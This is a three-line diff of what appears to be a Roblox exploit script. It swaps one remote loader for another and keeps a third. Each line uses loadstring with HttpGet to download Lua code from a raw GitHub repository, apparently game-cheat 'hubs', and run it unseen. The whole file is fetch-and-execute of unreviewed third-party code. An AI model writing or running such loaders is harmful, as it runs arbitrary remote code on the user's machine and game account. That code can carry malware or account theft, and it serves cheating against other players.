@@ -1,2 +1,3 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/kl'))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdelOnTheTop/Adel-Hub/main/Main.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Coblyez/scripts/main/fun%20thing"))()
